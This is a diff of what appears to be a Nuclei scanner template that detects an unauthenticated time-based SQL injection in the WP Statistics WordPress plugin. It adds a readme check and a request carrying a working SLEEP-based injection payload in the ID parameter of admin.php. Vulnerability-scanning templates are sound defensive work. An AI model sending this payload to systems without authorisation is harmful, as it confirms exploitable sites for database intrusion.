@@ -11,24 +11,39 @@ info:
     - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wp-statistics-sql-injection-13-0-7/
     - https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
     - https://wordpress.org/plugins/wp-statistics/
+  classification:
+    cpe: cpe:2.3:a:veronalabs:wp_statistics:*:*:*:*:wordpress:*:*:*
   metadata:
     verified: true
     max-request: 2
+    vendor: veronalabs
+    product: wp_statistics
     publicwww-query: /wp-content/plugins/wp-statistics/
-  tags: sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp
+  tags: time-based-sqli,sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp
+flow: http(1) && http(2)
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(6))a)"
-      - "{{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt"
+  - raw:
+      - |
+        GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - 'WP Statistics'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(7))a) HTTP/1.1
+        Host: {{Hostname}}
 
     matchers:
       - type: dsl
         dsl:
-          - 'duration>=6'
-          - 'contains(content_type, "text/html") && contains(body_2, "WP Statistics")'
+          - 'duration>=7'
           - 'status_code == 500'
         condition: and
-
-# digest: 4a0a00473045022100f4da8a4fa639e345d1927cec57054b9caa885d24d795fd99b7143bf9c351f10d02204a18fb4cd911412a0d3c77b4916424c8d074a3840c36664e57f8ac9f039cee9a:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100e8c92e31950b6abbd3ba9fe56e8f5ce6df4224aca7ffb60825d0c9e96a27792e022013ad505ffb6f37dd89d1001551757ecb3f573db23b23d9cec07e17fb7612bddd:922c64590222798bb761d5b6d8e72950
